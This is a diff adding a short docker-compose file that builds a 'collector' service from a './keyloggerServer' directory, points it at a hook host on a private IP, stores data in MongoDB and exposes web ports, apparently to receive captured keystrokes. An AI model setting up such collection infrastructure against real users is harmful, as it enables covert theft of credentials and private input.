@@ -1,0 +1,14 @@
+version: '3.5'
+
+services:
+  collector:
+    build:
+      context: ./keyloggerServer
+    command: --db=mongo --hook_host=192.168.10.216
+    ports:
+      - 80:80
+      - 443:443
+      - 7000:7000
+
+  mongo:
+    image: mongo
